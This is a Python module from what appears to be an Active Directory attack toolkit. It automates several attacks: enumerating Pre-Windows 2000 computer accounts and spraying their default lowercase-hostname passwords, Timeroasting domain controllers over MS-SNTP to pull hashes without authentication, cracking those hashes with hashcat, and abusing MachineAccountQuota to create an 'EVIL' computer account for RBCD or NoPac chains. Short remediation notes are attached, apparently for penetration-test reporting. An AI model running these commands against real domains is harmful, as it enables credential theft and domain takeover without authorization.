"""
Module: Pre-Windows 2000 Computer Accounts & Timeroasting
Techniques:
  - Pre2K: computer accounts with default password = lowercase hostname
  - Timeroasting: NTP/MS-SNTP hash extraction without any authentication
  - MachineAccountQuota (MAQ) enumeration & abuse
"""
from utils.helpers import *
from config.settings import SESSION

MENU = """
  ── PRE-AUTHENTICATION ATTACKS ──────────────────────────────────
  [1]  Pre-Windows 2000 Scan        (find Pre2K computer accounts)
  [2]  Pre2K Password Spray         (default pw = lowercase hostname)
  [3]  Timeroasting                 (NTP hash — NO auth required)
  [4]  Targeted Timeroasting        (specific RID via NTP)
  [5]  MachineAccountQuota Check    (ms-DS-MachineAccountQuota)
  [6]  Add Computer Account         (PowerMad / addcomputer.py)
  [7]  List Pre2K in BloodHound     (UAC flag 0x1000)
  [0]  Back
"""


def run():
    print_banner("PRE2K & TIMEROASTING", "Unauthenticated + Pre-Auth Attack Surface")
    dc   = input_or_session("dc_ip",    "DC IP")
    dom  = input_or_session("domain",   "Domain")
    user = input_or_session("username", "Username")
    pw   = input_or_session("password", "Password")

    base_dn = "DC=" + dom.replace(".", ",DC=")
    ldap_b  = f"ldapsearch -x -H ldaps://{dc}:636 -D '{user}@{dom}' -w '{pw}' -b '{base_dn}'"

    print(MENU)
    c = input(f"  {M}Choice:{RST} ").strip()

    # ── [1] Find Pre2K accounts ───────────────────────────────────────────────
    if c == "1":
        info("Finding computer accounts with UAC flag 0x1000 (PASSWD_NOTREQD)...")
        # Pre-Windows 2000 compatible flag: userAccountControl=4128 or userAccountControl includes bit 0x0020 (PASSWD_NOTREQD)
        out = run_cmd(
            f"{ldap_b} "
            f"'(&(objectClass=computer)(userAccountControl:1.2.840.113556.1.4.803:=32))' "
            f"sAMAccountName userAccountControl description operatingSystem",
            capture=True)
        save_result(out, "pre2k_accounts.txt", "enum")
        # Also check with pre2k tool
        info("Checking with pre2k tool...")
        run_cmd(f"pre2k unauth -d {dom} -dc-ip {dc} --output /tmp/pre2k_results.txt")
        info("Also check: nxc ldap {dc} -u '' -p '' --asreproast /tmp/pre2k_asrep.txt")
        add_finding("Pre-Windows 2000 Accounts Found", "High",
                    "Computer accounts with default passwords (= lowercase hostname) detected",
                    "Disable Pre-Windows 2000 compatible access; audit UAC flags")

    # ── [2] Pre2K password spray ──────────────────────────────────────────────
    elif c == "2":
        accounts_file = prompt("Path to Pre2K accounts file (default /tmp/pre2k_accounts.txt)") \
                        or "/tmp/pre2k_accounts.txt"
        info("Spraying default passwords (computerName$ → computername)...")
        print(f"""
  {NEON_CYN}Pre-Windows 2000 Default Password Logic:{RST}
  {DIM}Computer account WORKSTATION01$ → default password: workstation01
  pre2k auth -d {dom} -dc-ip {dc} -inputfile {accounts_file}
  OR manually:{RST}

  # For each computer in list:
  nxc smb {dc} -u 'COMPUTERNAME$' -p 'computername' -d {dom}
  nxc ldap {dc} -u 'COMPUTERNAME$' -p 'computername' -d {dom}
""")
        run_cmd(f"pre2k auth -d {dom} -dc-ip {dc} -inputfile {accounts_file} "
                f"--output /tmp/pre2k_spray_results.txt")

    # ── [3] Timeroasting ──────────────────────────────────────────────────────
    elif c == "3":
        info("Timeroasting — extracting NTP hashes without authentication...")
        print(f"""
  {NEON_CYN}Timeroasting (MS-SNTP Hash Extraction):{RST}
  {DIM}Abuses MS-SNTP extension: sends NTP request to DC, gets response MAC
  computed with the account's NT hash. Works for computer & trust accounts.
  NO authentication required — any RID can be queried.{RST}

  ── timeroast (Secura) ────────────────────────────────────────────────────
  sudo python3 /opt/timeroast/timeroast.py {dc} -o /tmp/timeroast_hashes.txt

  ── timeroast-ng ─────────────────────────────────────────────────────────
  pip3 install timeroast
  timeroast -t {dc} --outputfile /tmp/timeroast_hashes.txt

  ── Manual NTP request ───────────────────────────────────────────────────
  sudo python3 /opt/timeroast/timeroast.py {dc} --rid-range 500-2000

  ── Crack ────────────────────────────────────────────────────────────────
  hashcat -m 31300 /tmp/timeroast_hashes.txt /usr/share/wordlists/rockyou.txt
  # Mode 31300 = MS-SNTP (timeroast format)
""")
        run_cmd(f"sudo python3 /opt/timeroast/timeroast.py {dc} -o /tmp/timeroast_hashes.txt 2>/dev/null || "
                f"timeroast -t {dc} --outputfile /tmp/timeroast_hashes.txt 2>/dev/null || "
                f"echo 'Install: pip3 install timeroast  OR  git clone https://github.com/SecuraBV/Timeroast /opt/timeroast'")
        add_finding("Timeroasting Attempted", "High",
                    "NTP hash extraction via MS-SNTP — no auth required",
                    "Ensure computer/trust account passwords are strong and not predictable")

    # ── [4] Targeted Timeroasting ─────────────────────────────────────────────
    elif c == "4":
        rid = prompt("Target RID (e.g. 1001, or range 500-2000)") or "500-2000"
        info(f"Targeted Timeroasting for RID {rid}...")
        run_cmd(f"sudo python3 /opt/timeroast/timeroast.py {dc} --rid-range {rid} "
                f"-o /tmp/targeted_timeroast.txt")
        info("Crack: hashcat -m 31300 /tmp/targeted_timeroast.txt /usr/share/wordlists/rockyou.txt")

    # ── [5] MachineAccountQuota ───────────────────────────────────────────────
    elif c == "5":
        info("Checking ms-DS-MachineAccountQuota...")
        out = run_cmd(
            f"{ldap_b} '(objectClass=domain)' ms-DS-MachineAccountQuota",
            capture=True)
        print(out[:500])
        run_cmd(f"nxc ldap {dc} -u '{user}' -p '{pw}' -d {dom} -M maq")
        info("MAQ > 0 → any domain user can create computer accounts (RBCD, NoPac enabler)")

    # ── [6] Add computer account ──────────────────────────────────────────────
    elif c == "6":
        comp = prompt("New computer name (without $)") or "EVIL"
        cpw  = prompt("Computer password") or "P@ssw0rd123!"
        run_cmd(f"{imp('addcomputer.py')} -computer-name '{comp}$' "
                f"-computer-pass '{cpw}' {dom}/{user}:'{pw}' -dc-ip {dc}")
        info(f"Use {comp}$ / {cpw} for RBCD, Shadow Credentials, or NoPac chains")
        add_finding("Computer Account Created (MAQ Abuse)", "High",
                    f"Machine account {comp}$ created via MachineAccountQuota",
                    "Set ms-DS-MachineAccountQuota=0; restrict computer account creation")

    # ── [7] BloodHound UAC flags ──────────────────────────────────────────────
    elif c == "7":
        print(f"""
  {NEON_CYN}BloodHound Cypher — Pre2K Computer Accounts:{RST}

  // Find computers with PASSWD_NOTREQD (bit 32)
  MATCH (c:Computer) WHERE c.useraccountcontrol CONTAINS "PASSWD_NOTREQD"
  RETURN c.name, c.operatingsystem

  // Find computers with never-expired passwords
  MATCH (c:Computer) WHERE c.pwdlastset < 0 OR c.pwdlastset = 0
  RETURN c.name

  // Find accounts with weak UAC flags
  MATCH (u:User) WHERE u.dontreqpreauth = true
  RETURN u.name
""")

    pause()
